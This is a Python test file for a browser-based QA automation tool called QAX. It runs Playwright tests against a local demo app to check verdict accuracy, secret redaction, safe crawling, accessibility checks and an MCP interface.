"""
test_browser_engine.py — the UI engine in a REAL browser (Playwright + Chromium)
================================================================================
Positive control for functional QA: evals/targets/ui_demo_app.py (one planted bug)
and evals/data/ui_demo_cases.json (each case carries its true outcome). The run
must reproduce the truth exactly — working flows PASS, the planted bug FAILs, a
step QAX cannot run is SKIP (never PASS) — and, with AI healing off (the default),
nothing may be sent to the AI provider even when a key is set.

Skipped (and says why) when Playwright or its Chromium is not installed.
"""

import asyncio
import json
import socket
import sys
import threading
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]

playwright = pytest.importorskip("playwright.async_api", reason="Playwright not installed")


def _chromium_available() -> bool:
    """True when Playwright's Chromium can actually launch here."""
    from playwright.sync_api import sync_playwright
    try:
        with sync_playwright() as p:
            p.chromium.launch(headless=True).close()
        return True
    except Exception:  # noqa: BLE001
        return False


pytestmark = pytest.mark.skipif(not _chromium_available(),
                                reason="Chromium not installed (playwright install chromium)")


@pytest.fixture
def ui_app(monkeypatch, tmp_path):
    """Serve the demo app on a free local port for one test."""
    import importlib.util

    from werkzeug.serving import make_server
    spec = importlib.util.spec_from_file_location("ui_demo_app", ROOT / "evals/targets/ui_demo_app.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    server = make_server("127.0.0.1", port, mod.app, threaded=True)   # /stream never ends
    threading.Thread(target=server.serve_forever, daemon=True).start()
    monkeypatch.setenv("APP_BASE_URL", f"http://127.0.0.1:{port}")
    monkeypatch.setenv("DEFAULT_PROJECT", "uidemo")
    monkeypatch.setenv("AUTO_BUG_REPORT", "false")
    monkeypatch.delenv("QAX_AI_HEAL", raising=False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test-not-a-real-key")   # a key is present …
    monkeypatch.chdir(tmp_path)                                         # screenshots go here
    yield port
    server.shutdown()


def _cases():
    """The positive-control cases with their true outcomes."""
    return json.loads((ROOT / "evals/data/ui_demo_cases.json").read_text(encoding="utf-8"))["test_cases"]


def _run(cases):
    """Execute cases with the real PlaywrightRunner + TestExecutor (headless)."""
    from execution.playwright_runner import PlaywrightRunner
    from execution.test_executor import TestExecutor

    async def go():
        runner = PlaywrightRunner()
        await runner.setup(headless=True)
        try:
            return await TestExecutor().execute_batch(cases, runner)
        finally:
            await runner.teardown()
    return asyncio.run(go())


def test_real_browser_run_reproduces_the_truth_and_sends_nothing_to_ai(ui_app, monkeypatch):
    import anthropic

    ai_calls = []   # recorded, not raised: the healer swallows exceptions

    def no_ai(*a, **k):
        ai_calls.append(1)
        raise RuntimeError("blocked in test")
    monkeypatch.setattr(anthropic, "Anthropic", no_ai)          # … but must never be used

    cases = _cases()
    batch = _run(cases)
    got = {r["test_case_id"]: r["status"] for r in batch["results"]}
    want = {c["test_case_id"]: c["expected_outcome"].split()[0] for c in cases}
    assert got == want, batch["results"]
    assert batch["passed"] == 3 and batch["failed"] == 1 and batch["skipped"] == 1
    assert ai_calls == [], "an AI provider call was made with AI healing off"
    failed = next(r for r in batch["results"] if r["status"] == "FAIL")
    assert failed["screenshot"] and Path(failed["screenshot"]).exists()   # evidence captured


def test_an_assertion_that_cannot_be_evaluated_is_not_a_pass(ui_app):
    case = {"test_case_id": "TC-X", "title": "unknown selector", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "assert", "assertion_type": "url"}]}  # no value
    r = _run([case])["results"][0]
    assert r["status"] == "SKIP" and r["steps"][1]["status"] == "SKIP"


def test_positive_control_the_ai_detector_sees_a_call_when_healing_is_opted_in(ui_app, monkeypatch):
    """Proves the zero-AI assertion above can fail: with --ai-heal the healer does call out."""
    import anthropic
    calls = []

    def record(*a, **k):
        calls.append(1)
        raise RuntimeError("blocked in test")
    monkeypatch.setattr(anthropic, "Anthropic", record)
    monkeypatch.setenv("QAX_AI_HEAL", "true")
    # a locating failure (the only kind healing may touch): a dashboard button clicked on the login page.
    # An assertion failure is never sent to healing (tests/test_hardening_round.py).
    moved = {"test_case_id": "TC-MOVED", "title": "element not on this page", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "add_note_button"}]}
    assert _run([moved])["results"][0]["status"] == "FAIL"   # healing failed → still FAIL
    assert calls, "the detector did not see the opted-in AI call"


def test_web_execute_runs_the_browser_engine_end_to_end(ui_app, monkeypatch):
    """The web UI path: POST /api/execute engine=ui → real Chromium → the same truth."""
    monkeypatch.delenv("QAX_API_TOKEN", raising=False)
    from web.server import app
    cases = _cases()
    r = app.test_client().post("/api/execute", json={
        "tests": cases, "url": f"http://127.0.0.1:{ui_app}", "engine": "ui", "project": "uidemo",
        "read_only": False, "authorized": True})
    d = r.get_json()
    assert r.status_code == 200, d
    got = {x["test_case_id"]: x["status"] for x in d["results"]}
    assert got == {c["test_case_id"]: c["expected_outcome"].split()[0] for c in cases}
    import os
    assert os.environ.get("QAX_AI_HEAL") is None              # restored after the run



# ── Regressions from the first real-app run (linkding 1.47.0, 2026-10-19) ─────
# Each of these broke QAX on a real app while the demo app was green.


def _login_case(cid):
    return {"test_case_id": cid, "title": "login", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "username", "value": "demo"},
        {"step_number": 3, "playwright_action": "fill", "selector_key": "password", "value": "demo123"},
        {"step_number": 4, "playwright_action": "click", "selector_key": "login_button"},
        {"step_number": 5, "playwright_action": "assert", "assertion_type": "url",
         "assertion_value": "/dashboard"}]}


def test_each_case_gets_a_fresh_session(ui_app):
    """linkding: after one case logged in, /login redirected and every later case lost its form."""
    batch = _run([_login_case("A"), _login_case("B"), _login_case("C")])
    assert [r["status"] for r in batch["results"]] == ["PASS", "PASS", "PASS"], batch["results"]


def test_an_assertion_waits_for_an_async_update_and_a_real_failure_still_fails(ui_app, monkeypatch):
    """linkding (Turbo): checked 3 ms after the click → false FAIL. Now retried until a timeout."""
    monkeypatch.setenv("QAX_ASSERT_TIMEOUT_MS", "3000")

    def case(cid, expected):
        return {"test_case_id": cid, "title": cid, "automation_steps": [
            {"step_number": 1, "playwright_action": "navigate", "value": "/delayed"},
            {"step_number": 2, "playwright_action": "click", "selector_key": "save_button"},
            {"step_number": 3, "playwright_action": "assert", "selector_key": "status",
             "assertion_type": "text", "assertion_value": expected}]}
    batch = _run([case("late-text", "Saved!"), case("never", "Deleted!")])
    got = {r["test_case_id"]: r for r in batch["results"]}
    assert got["late-text"]["status"] == "PASS"
    assert got["never"]["status"] == "FAIL"
    assert "still failing after 3s" in got["never"]["steps"][2]["actual_result"]


def test_a_secret_comes_from_the_environment_and_never_reaches_the_report(ui_app, monkeypatch, tmp_path):
    """Case files must not hold passwords, and typed secrets must not be printed."""
    monkeypatch.setenv("QAX_VAR_DEMO_PASSWORD", "demo123")
    case = _login_case("S")
    case["automation_steps"][2]["value"] = "{{env:QAX_VAR_DEMO_PASSWORD}}"
    batch = _run([case])
    r = batch["results"][0]
    assert r["status"] == "PASS"                              # the real value was typed
    shown = " ".join(s.get("actual_result", "") for s in r["steps"])
    assert "demo123" not in shown and "QAX_VAR_DEMO_PASSWORD" in shown
    from execution.results_reporter import ResultsReporter
    html = Path(ResultsReporter().generate_html_report(batch, output_folder=str(tmp_path))).read_text(encoding="utf-8")
    assert "demo123" not in html


def test_only_qax_var_names_can_be_typed_from_the_environment(monkeypatch):
    from execution.action_mapper import resolve_step_value
    monkeypatch.setenv("QAX_VAR_OK", "v")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret")
    assert resolve_step_value("{{env:QAX_VAR_OK}}") == ("v", "QAX_VAR_OK")
    assert resolve_step_value("{{env:ANTHROPIC_API_KEY}}")[0] != "sk-secret"   # never resolved


def _discover(url, page_name):
    from core.dom_analyzer import DOMAnalyzer
    from playwright.async_api import async_playwright

    async def go():
        async with async_playwright() as p:
            b = await p.chromium.launch(headless=True)
            page = await b.new_page()
            try:
                return await DOMAnalyzer().discover_selectors(url, page_name, page)
            finally:
                await b.close()
    return asyncio.run(go())


def test_discovery_works_without_ai_and_on_a_page_that_never_goes_idle(ui_app, monkeypatch):
    """linkding: waiting for network idle timed out (0 selectors); with no AI credit, 0 again."""
    import anthropic
    monkeypatch.delenv("QAX_AI_DISCOVER", raising=False)
    monkeypatch.setattr(anthropic, "Anthropic", lambda *a, **k: pytest.fail("AI used without --ai"))
    sel = _discover(f"http://127.0.0.1:{ui_app}/live", "live")
    assert sel.get("live_field") == "#live-input" or "#live-input" in sel.values(), sel


def test_discovering_the_login_page_records_the_login_form(ui_app, monkeypatch):
    """linkding: with APP_USERNAME/PASSWORD set, discovery logged in first and labelled the page behind it."""
    monkeypatch.setenv("APP_USERNAME", "demo")
    monkeypatch.setenv("APP_PASSWORD", "demo123")
    sel = _discover(f"http://127.0.0.1:{ui_app}/login", "login")
    assert {"#username", "#password", "#login-btn"} <= set(sel.values()), sel


def test_page_key_checks_text_anywhere_and_writes_are_recorded(ui_app):
    """No selector for an error that only appears after a click → the built-in `page` key;
    and the run says which data-changing requests it sent (QAX does not undo them)."""
    case = {"test_case_id": "P", "title": "p", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "username", "value": "demo"},
        {"step_number": 3, "playwright_action": "fill", "selector_key": "password", "value": "nope"},
        {"step_number": 4, "playwright_action": "click", "selector_key": "login_button"},
        {"step_number": 5, "playwright_action": "assert", "selector_key": "page",
         "assertion_type": "text", "assertion_value": "Invalid username or password"}]}
    batch = _run([case])
    r = batch["results"][0]
    assert r["status"] == "PASS", r["steps"]
    assert r["writes"] == [{"method": "POST", "host": f"127.0.0.1:{ui_app}", "path": "/login"}]
    assert batch["writes_sent"] == 1


def test_tls_errors_are_not_ignored_unless_opted_in(monkeypatch):
    import execution.playwright_runner as pr
    seen = []

    class _Ctx:
        def set_default_timeout(self, ms): pass
        def on(self, ev, fn): pass
        async def new_page(self): return object()

    class _Browser:
        async def new_context(self, **kw):
            seen.append(kw.get("ignore_https_errors"))
            return _Ctx()
    r = pr.PlaywrightRunner()
    r.browser = _Browser()
    monkeypatch.delenv("QAX_INSECURE", raising=False)
    asyncio.run(r._open_context())
    monkeypatch.setenv("QAX_INSECURE", "true")
    asyncio.run(r._open_context())
    assert seen == [False, True]


# ── Reading the app from its URL (`map`) ──────────────────────────────────────


def test_map_reads_the_app_logs_in_and_never_follows_logout(ui_app):
    from core.app_mapper import map_app
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", username="demo", password="demo123"))
    assert m.error is None and m.login_ok is True
    paths = {p["path"] for p in m.pages}
    assert "/dashboard" in paths
    dash = next(p for p in m.pages if p["path"] == "/dashboard")
    assert dash["elements"].get("add_note_button") == "#add-note-btn"
    assert any("logout" in h for h in m.skipped_links)       # seen, not followed
    assert "/logout" not in paths
    # the login POST is expected: it is marked, never reported as "data changed while reading"
    assert m.writes and all(w.get("login") for w in m.writes), m.writes


def test_a_selector_written_directly_in_a_step_is_used_as_is(ui_app):
    """Generation grounded in the map may write the real selector instead of a key name."""
    case = {"test_case_id": "R", "title": "raw", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "#username", "value": "demo"},
        {"step_number": 3, "playwright_action": "fill", "selector_key": "input[name='password']",
         "value": "demo123"},
        {"step_number": 4, "playwright_action": "click", "selector_key": "#login-btn"},
        {"step_number": 5, "playwright_action": "assert", "assertion_type": "url",
         "assertion_value": "/dashboard"}]}
    assert _run([case])["results"][0]["status"] == "PASS"


def test_a_failure_while_the_app_rate_limits_is_error_not_fail(ui_app):
    """Healthchecks: after many logins it answered 200 + "Too many attempts" and every case
    FAILed — a verdict about the rate limit, not the feature. Both signals → ERROR."""
    def case(cid, path):
        return {"test_case_id": cid, "title": cid, "automation_steps": [
            {"step_number": 1, "playwright_action": "navigate", "value": path},
            {"step_number": 2, "playwright_action": "assert", "selector_key": "page",
             "assertion_type": "text", "assertion_value": "Welcome"}]}
    import os
    os.environ["QAX_ASSERT_TIMEOUT_MS"] = "500"
    try:
        batch = _run([case("http429", "/busy"), case("text", "/busy-text"), case("real", "/login")])
    finally:
        os.environ.pop("QAX_ASSERT_TIMEOUT_MS", None)
    got = {r["test_case_id"]: r for r in batch["results"]}
    assert got["http429"]["status"] == "ERROR" and "429" in got["http429"]["error"]
    assert got["text"]["status"] == "ERROR" and "Too many attempts" in got["text"]["error"]
    assert got["real"]["status"] == "FAIL"            # an ordinary failure stays a FAIL
    assert batch["throttled"] == 2


def test_a_name_used_on_two_pages_resolves_to_the_one_on_this_page(ui_app, tmp_path, monkeypatch):
    """Healthchecks: "email" existed on /login and on /settings; last-wins picked the wrong one."""
    import json as _json

    import execution.action_mapper as am
    proj = tmp_path / "projects" / "twopages"
    proj.mkdir(parents=True)
    (proj / "selectors.json").write_text(_json.dumps({
        "login": {"name_field": "#username"},
        "dashboard": {"name_field": "#note-input"}}), encoding="utf-8")
    monkeypatch.setattr(am, "_resolve_selectors_path", lambda project=None: proj / "selectors.json")
    monkeypatch.setenv("DEFAULT_PROJECT", "twopages")
    case = {"test_case_id": "N", "title": "n", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "name_field", "value": "demo"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS" and r["steps"][1]["selector_used"] == "#username"


def test_an_unknown_element_name_is_error_and_never_fuzzy_matched(ui_app):
    """Fuzzy matching resolved "page" to a "man-pages" link (Healthchecks); a name like
    "remove" could resolve to a destructive button. Structured steps: exact names only."""
    case = {"test_case_id": "U", "title": "u", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "login"}]}  # ≠ login_button
    r = _run([case])["results"][0]
    assert r["status"] == "ERROR" and r["steps"][1]["status"] == "ERROR"
    assert "not in the project's selectors" in r["steps"][1]["error"]


def test_map_marks_elements_hidden_until_a_menu_is_opened(ui_app):
    from core.app_mapper import map_app
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=["/delayed"]))
    delayed = next(p for p in m.pages if p["path"] == "/delayed")
    assert "save_button" in delayed["elements"] and delayed["hidden"] == []
    assert isinstance(m.as_context(), str) and "/delayed" in m.as_context()   # context renders the page


# ── Single-page apps (PocketBase dashboard, 2026-10-19) ───────────────────────


def test_map_reads_spa_routes_waits_for_late_forms_and_avoids_per_render_ids(ui_app):
    from core.app_mapper import map_app
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=["/spa"]))
    pages = {p["path"]: p for p in m.pages}
    assert "/spa#/settings" in pages and "/spa#/home" in pages          # hash routes are pages
    assert "#/export-data" in m.skipped_links                           # risky verb in the route
    el = pages["/spa#/settings"]["elements"]
    assert el.get("app_name") == "input[name='appname']"               # not #name_<random>
    assert el.get("save_changes_button") == "button:has-text('Save changes')"  # text in a child


def _spa_case(cid, value, expect):
    return {"test_case_id": cid, "title": cid, "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/spa#/settings"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "input[name='appname']",
         "value": value},
        {"step_number": 3, "playwright_action": "click", "selector_key": "button:has-text('Save changes')"},
        {"step_number": 4, "playwright_action": "navigate", "value": "/spa#/home"},
        {"step_number": 5, "playwright_action": "navigate", "value": "/spa#/settings"},
        {"step_number": 6, "playwright_action": "assert", "selector_key": "input[name='appname']",
         "assertion_type": "value", "assertion_value": expect}]}


def test_value_assertions_unique_values_and_disabled_buttons(ui_app, monkeypatch):
    monkeypatch.setenv("QAX_ASSERT_TIMEOUT_MS", "1500")
    batch = _run([_spa_case("saved", "App {{unique}}", "App {{unique}}"),       # repeatable
                  _spa_case("wrong", "App {{unique}}", "Something else"),        # real mismatch
                  _spa_case("same", "Demo", "Demo")])                            # no change → disabled
    got = {r["test_case_id"]: r for r in batch["results"]}
    assert got["saved"]["status"] == "PASS"
    assert got["wrong"]["status"] == "FAIL"                       # "Rate limits" heading ≠ throttled
    assert not got["wrong"].get("throttled")
    same = got["same"]
    assert same["status"] == "FAIL" and "disabled" in same["steps"][2]["actual_result"]
    assert same["duration_seconds"] < 12                          # no 15 s click timeout


# ── Map hardening (2026-10-19, second round) ─────────────────────────────────


def test_map_opens_menus_and_records_what_they_reveal_without_submitting_forms(ui_app):
    import urllib.request
    from core.app_mapper import map_app
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=["/menu-page"]))
    page = next(p for p in m.pages if p["path"] == "/menu-page")
    assert page["opened_by"].get("profile_link") == "account_button"          # click Account first
    posts = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{ui_app}/_posts").read())["posts"]
    assert posts == [] and not [w for w in m.writes if w["path"] == "/add-user"]   # typeless button untouched


def test_a_page_with_password_fields_is_not_taken_for_a_login_page(ui_app):
    """Django's "add user" page: auto-login filled it with the operator's credentials and submitted it."""
    import urllib.request

    from core.dom_analyzer import DOMAnalyzer
    from playwright.async_api import async_playwright
    import os
    os.environ["APP_USERNAME"], os.environ["APP_PASSWORD"] = "demo", "demo123"

    async def go():
        async with async_playwright() as p:
            b = await p.chromium.launch(headless=True)
            page = await b.new_page()
            await page.goto(f"http://127.0.0.1:{ui_app}/add-user")
            done = await DOMAnalyzer().login_if_needed(page)
            await page.goto(f"http://127.0.0.1:{ui_app}/login")
            real = await DOMAnalyzer().login_if_needed(page)
            await b.close()
            return done, real
    try:
        done, real = asyncio.run(go())
    finally:
        os.environ.pop("APP_USERNAME", None); os.environ.pop("APP_PASSWORD", None)
    posts = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{ui_app}/_posts").read())["posts"]
    assert done is False and posts == []                  # nothing submitted on "add user"
    assert real is True                                   # the real login form still works


def test_explore_actions_follows_risky_links_only_when_asked(ui_app):
    from core.app_mapper import map_app
    safe = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", username="demo", password="demo123"))
    assert any("logout" in h for h in safe.skipped_links) and not safe.explored_actions
    bold = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", username="demo", password="demo123",
                               explore_actions=True))
    assert any("logout" in a for a in bold.explored_actions)


def test_the_runner_gets_past_obstacles_and_reports_page_problems(ui_app):
    """Cookie banner (privacy-preserving answer), an overlay over the button, a button below the
    fold, a link that opens a new tab — none may stop the run; a JS exception and an HTTP 500
    in the background are reported even though the case passes."""
    case = {"test_case_id": "OBS", "title": "obstacles", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/obstacles"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "#covered-btn"},
        {"step_number": 3, "playwright_action": "assert", "selector_key": "#out",
         "assertion_type": "text", "assertion_value": "Covered clicked"},
        {"step_number": 4, "playwright_action": "click", "selector_key": "#far-btn"},
        {"step_number": 5, "playwright_action": "assert", "selector_key": "#out",
         "assertion_type": "text", "assertion_value": "Far clicked"},
        {"step_number": 6, "playwright_action": "click", "selector_key": "#newtab-link"},
        {"step_number": 7, "playwright_action": "assert", "selector_key": "#help-title",
         "assertion_type": "text", "assertion_value": "Help centre"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error"))
                                   for s in r["steps"]]
    assert "Reject all" in r["steps"][0]["actual_result"]               # not "Accept all"
    assert "Escape" in r["steps"][1]["actual_result"]                   # overlay handled
    kinds = {e["kind"] for e in r.get("page_errors", [])}
    assert "javascript exception" in kinds and "HTTP 500" in kinds


def test_elements_inside_an_iframe_are_read_and_used(ui_app):
    """An embedded form (payments, editors, widgets) lives in another document: the reader lists
    its elements as "iframe >>> element", and a run fills, clicks and checks inside it — by that
    selector and by a plain selector the runner finds in the frame."""
    import asyncio

    from playwright.async_api import async_playwright

    from core.dom_analyzer import FRAME_SEP, label_page

    async def read():
        async with async_playwright() as p:
            b = await p.chromium.launch()
            pg = await b.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/frames")
            await pg.wait_for_timeout(300)
            els, _hidden = await label_page(pg)
            await b.close()
            return els
    els = asyncio.run(read())
    framed = {k: v for k, v in els.items() if FRAME_SEP in v}
    assert framed.get("card_number") == "iframe#pay-frame >>> #card", els
    assert any(v.endswith("#pay") for v in framed.values()), els
    case = {"test_case_id": "IFR", "title": "pay inside an iframe", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/frames"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "iframe#pay-frame >>> #card", "value": "4242"},
        {"step_number": 3, "playwright_action": "click", "selector_key": "#pay"},          # found in the frame
        {"step_number": 4, "playwright_action": "assert", "selector_key": "#paid",
         "assertion_type": "text", "assertion_value": "Paid with 4242"},
        {"step_number": 5, "playwright_action": "assert", "assertion_type": "url", "assertion_value": "/frames"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error"))
                                   for s in r["steps"]]


def test_each_page_a_case_visits_gets_accessibility_and_performance_basics(ui_app):
    """Observations, never a verdict: the case passes; what a QA engineer would notice on the
    way is reported with its WCAG criterion, and page timings are measured."""
    case = {"test_case_id": "A11Y", "title": "signup page", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/a11y"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "#icon-btn"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS"
    q = r["quality"]
    page = next(p for p in q["pages"] if p["url"] == "/a11y")
    rules = " | ".join(i["rule"] for i in page["accessibility"])
    for expected in ("image without text alternative", "form field without a label",
                     "button without a name", "text contrast", "heading level skipped"):
        assert expected in rules, rules
    assert next(i for i in page["accessibility"] if "contrast" in i["rule"])["wcag"] == "1.4.3"
    assert isinstance(page["performance"].get("dom_ready_ms"), int)
    assert q["issues"] >= 5


def test_axe_core_finds_the_planted_accessibility_problems_when_asked(ui_app, monkeypatch):
    """QAX_A11Y=axe: the vendored axe-core (unmodified, MPL-2.0) audits the same page — the planted
    problems are found with their WCAG criterion and impact, and the case still PASSES (observations)."""
    from core import page_quality
    assert page_quality.AXE_PATH.is_file()
    monkeypatch.setenv("QAX_A11Y", "axe")
    case = {"test_case_id": "AXE", "title": "signup page", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/a11y"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "#icon-btn"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS"
    page = next(p for p in r["quality"]["pages"] if p["url"] == "/a11y")
    assert page["a11y_engine"] == f"axe-core {page_quality.AXE_VERSION}"
    ids = {i["note"] for i in page["accessibility"]}
    for expected in ("image-alt", "button-name", "color-contrast", "html-has-lang"):
        assert expected in ids, ids
    # a placeholder-only field is named under ARIA rules: axe does not call it a WCAG failure
    # (the basic checks still note it as "form field without a label")
    assert "label" not in ids
    contrast = next(i for i in page["accessibility"] if i["note"] == "color-contrast")
    assert contrast["wcag"] == "1.4.3" and contrast["impact"]


def test_a_chrome_recording_runs_as_recorded_and_its_check_can_fail(ui_app, monkeypatch):
    """Record once, run on every change: the imported Chrome Recorder flow passes on the demo app,
    and the same flow with an impossible final check fails (the check is real)."""
    import copy

    from core.recording_import import convert
    monkeypatch.setenv("QAX_VAR_PASSWORD", "demo123")
    case = convert((ROOT / "tests/data/recordings/chrome_add_note.json").read_text(encoding="utf-8"), case_id="REC-1")["case"]
    neg = copy.deepcopy(case)
    neg["test_case_id"] = "REC-NEG"
    neg["automation_steps"][-1]["selector_key"] = 'text="a note nobody added"'
    by = {r["test_case_id"]: r["status"] for r in _run([case, neg])["results"]}
    assert by == {"REC-1": "PASS", "REC-NEG": "FAIL"}, by


def test_a_ticket_reproduces_the_planted_bug_and_not_a_working_feature(ui_app, monkeypatch):
    """Plain-language tickets, no AI: the planted bug (an empty note is accepted) is REPRODUCED; the wrong-password
    message, which works, is NOT REPRODUCED — each decided at the ticket's own check."""
    from core.ticket_repro import reproduce

    def run(cases):
        return _run(cases)["results"]
    tickets = ROOT / "tests/data/tickets"
    bug = reproduce((tickets / "demo_empty_note.md").read_text(encoding="utf-8"), f"http://127.0.0.1:{ui_app}", "uidemo", run=run)
    ok = reproduce((tickets / "demo_wrong_password.md").read_text(encoding="utf-8"), f"http://127.0.0.1:{ui_app}", "uidemo", run=run)
    assert bug["verdict"] == "REPRODUCED", bug
    assert ok["verdict"] == "NOT REPRODUCED", ok
    assert "fix_brief" in bug and "Note cannot be empty" in bug["fix_brief"]


def test_a_coding_agent_can_run_qax_over_mcp(ui_app, monkeypatch):
    """`main.py mcp`: the protocol handshake, the tool list, the authorization gate, and a real
    browser run of the demo cases — the planted bug FAILS, the unrunnable step is not a PASS."""
    import io

    from core.mcp_server import serve
    monkeypatch.delenv("QAX_API_TOKEN", raising=False)
    cases = str(ROOT / "evals/data/ui_demo_cases.json")
    url = f"http://127.0.0.1:{ui_app}"
    msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}},
            {"jsonrpc": "2.0", "method": "notifications/initialized"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
            {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "qax_run_tests", "arguments": {
                "url": url, "cases_file": cases, "project": "uidemo"}}},
            {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "qax_run_tests", "arguments": {
                "url": url, "cases_file": cases, "project": "uidemo", "authorized": True}}}]
    out = io.StringIO()
    serve(io.StringIO("\n".join(json.dumps(m) for m in msgs) + "\n"), out)
    replies = [json.loads(x) for x in out.getvalue().splitlines()]
    assert [r["id"] for r in replies] == [1, 2, 3, 4]                     # no reply to the notification
    assert replies[0]["result"]["serverInfo"]["name"] == "qax"
    names = {t["name"] for t in replies[1]["result"]["tools"]}
    assert {"qax_read_app", "qax_write_tests", "qax_run_tests", "qax_scan", "qax_bug_preview"} <= names
    assert replies[2]["result"]["isError"] is True                         # not authorized → nothing ran
    d = json.loads(replies[3]["result"]["content"][0]["text"])
    by = {r["test_case_id"]: r["status"] for r in d["results"]}
    assert by["TC-UI-001"] == "PASS" and by["TC-UI-004"] == "FAIL" and by["TC-UI-005"] != "PASS", by


def test_a_failure_after_a_step_that_could_not_run_is_an_error_not_a_bug(ui_app):
    """Found in the E2E flow: 'login_button' was unknown (ERROR), so the user never logged in and
    'add note' timed out — that FAIL said nothing about the app, yet became a bug."""
    case = {"test_case_id": "CHAIN", "title": "chain", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "click", "selector_key": "no_such_button"},
        {"step_number": 3, "playwright_action": "click", "selector_key": "#add-note-btn"}]}
    r = _run([case])["results"][0]
    assert [s["status"] for s in r["steps"]] == ["PASS", "ERROR", "FAIL"]
    assert r["status"] == "ERROR" and "could not run" in r["error"]


def test_the_generation_quality_eval_scores_cases_and_runs_them(tmp_path, monkeypatch):
    """The harness that measures AI-written cases (no credit when it was built) is itself
    tested with a stand-in generator: a good set meets the bar; it finds the planted bug."""
    from evals import generation_quality as gq
    monkeypatch.chdir(tmp_path)
    import core.app_mapper as am
    monkeypatch.setattr(am, "CONFIG_DIR", tmp_path / "projects")
    login = [{"playwright_action": "navigate", "value": "/login"},
             {"playwright_action": "fill", "selector_key": "#username", "value": "demo"},
             {"playwright_action": "fill", "selector_key": "#password", "value": "demo123"},
             {"playwright_action": "click", "selector_key": "#login-btn"}]

    def fake(story, app_map, ctx):
        assert "AC-2: An empty note is rejected" in ctx and app_map.pages
        mk = lambda i, ac, tech, steps, tt="functional", title="t": {  # noqa: E731
            "test_case_id": i, "title": title, "test_type": tt,
            "description": f"Covers: {ac} | Technique: {tech}.", "automation_steps": login + steps}
        return [mk("G1", "AC-1", "Use Case Testing", [{"playwright_action": "fill", "selector_key": "#note-input", "value": "milk {{unique}}"},
                                                       {"playwright_action": "click", "selector_key": "#add-note-btn"},
                                                       {"playwright_action": "assert", "selector_key": "#notes", "assertion_type": "text", "assertion_value": "milk"}]),
                mk("G2", "AC-2", "Equivalence Partitioning", [{"playwright_action": "fill", "selector_key": "#note-input", "value": ""},
                                                              {"playwright_action": "click", "selector_key": "#add-note-btn"},
                                                              {"playwright_action": "assert", "selector_key": "#error", "assertion_type": "text", "assertion_value": "Note cannot be empty"}],
                   title="An empty note is rejected"),
                mk("G3", "AC-4", "Use Case Testing", [{"playwright_action": "assert", "selector_key": "#welcome", "assertion_type": "text", "assertion_value": "Welcome, demo"}]),
                {"test_case_id": "G4", "title": "Wrong password is rejected", "test_type": "security",
                 "description": "Covers: AC-3 | Technique: Error Guessing (access control).",
                 "automation_steps": [{"playwright_action": "navigate", "value": "/login"},
                                      {"playwright_action": "fill", "selector_key": "#username", "value": "demo"},
                                      {"playwright_action": "fill", "selector_key": "#password", "value": "nope"},
                                      {"playwright_action": "click", "selector_key": "#login-btn"},
                                      {"playwright_action": "assert", "selector_key": "#error", "assertion_type": "text",
                                       "assertion_value": "Invalid username or password"}]}], None
    code = gq.run(str(ROOT / "evals/data/generation_stories.json"), str(tmp_path / "q.json"), generate=fake)
    assert json.loads((tmp_path / "q.json").read_text(encoding="utf-8"))["ai"] == "stand-in generator (test)"   # a record names what it measured
    rec = json.loads((tmp_path / "q.json").read_text(encoding="utf-8"))["stories"][0]
    assert rec["review"]["coverage_pct"] == 100 and rec["review"]["grounded_pct"] == 100
